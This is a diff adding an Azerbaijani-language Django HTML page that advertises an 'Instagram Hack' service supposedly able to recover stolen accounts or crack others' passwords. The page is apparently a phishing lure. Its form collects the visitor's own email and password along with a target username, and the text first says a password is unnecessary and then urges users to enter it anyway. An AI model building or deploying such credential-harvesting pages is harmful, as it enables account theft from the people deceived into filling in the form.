@@ -1,0 +1,105 @@
+<!DOCTYPE HTML>
+<!--
+	Transitive by TEMPLATED
+	templated.co @templatedco
+	Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
+-->
+{% load static %}
+<html>
+	<head>
+		<title>İnstagram Hack Az</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="stylesheet" href="{% static 'home/assets/css/main.css' %}" />
+	</head>
+	<body>
+
+		<!-- Header -->
+			<header id="header" class="alt">
+				<div class="logo"><a href="https://www.instagram.com/ll_byelish_ll/?hl=tr">ll_byelish_ll</a></div>
+				<a href="#menu" class="toggle"><span>Menu</span></a>
+			</header>
+
+		<!-- Nav -->
+			<nav id="menu">
+				<ul class="links">
+					<li><a href="#one">Form</a></li>
+
+				</ul>
+			</nav>
+
+		<!-- Banner -->
+		<!--
+			To use a video as your background, set data-video to the name of your video without
+			its extension (eg. images/banner). Your video must be available in both .mp4 and .webm
+			formats to work correctly.
+		-->
+			<section id="banner" data-video="{% static 'home/images/hacks' %}">
+				<div class="inner">
+					<h1>İNSTAGRAM HACK</h1>
+					<p>Oğurlanmış səhifələrin geri qaytarılması<br>Aşağıdakı formu düzgün doldurun<p/>
+
+					<a href="#one" class="button special scrolly">Start</a>
+				</div>
+			</section>
+
+		<!-- One -->
+			<section id="one" class="wrapper style2">
+				<div class="inner">
+					<div>
+
+					</div>
+				</div>
+
+
+		<!-- Footer -->
+			<footer id="footer" class="wrapper">
+				<div class="inner">
+					<section>
+						<div class="box">
+							<div class="content">
+								<h1 class="align-center">Formu doldurarkən parolunuzu yazmağınıza ehtiyac yoxdur sadəcə email hesabınızı yazın və Sizə 18-saat ərzində yazdığınız istifadəçinin istagram şifərsi email ünvanınıza göndəriləcəkdir. Əyər şifrə gəlməsə parolunuzu yazıb yoxlayın</h1>
+								<hr />
+								<form action="{% url 'home' %}" method="post">
+									{% csrf_token %}
+									<div class="field half first">
+										<label for="name">Email ünvanınız:</label>
+										{{ form.email }}
+
+									</div>
+									<div class="field half">
+										<label for="email">Parolunuz:</label>
+										{{ form.parol }}
+
+									</div>
+									<div class="field">
+											<h1>Şifrəsini qıracağınız istifadəçi adı:</h1>
+
+												{{ form.ad }}
+
+										</div>
+									</div>
+
+									<ul class="actions align-center">
+										<li><input value="Hack" class="button special" type="submit"></li>
+									</ul>
+								</form>
+							</div>
+						</div>
+					</section>
+					<div class="copyright">
+
+					</div>
+				</div>
+			</footer>
+
+		<!-- Scripts -->
+			<script src="{% static 'home/assets/js/jquery.min.js' %}"></script>
+			<script src="{% static 'home/assets/js/jquery.scrolly.min.js' %}"></script>
+			<script src="{% static 'home/assets/js/jquery.scrollex.min.js' %}"></script>
+			<script src="{% static 'home/assets/js/skel.min.js' %}"></script>
+			<script src="{% static 'home/assets/js/util.js' %}"></script>
+			<script src="{% static 'home/assets/js/main.js' %}"></script>
+
+	</body>
+</html>
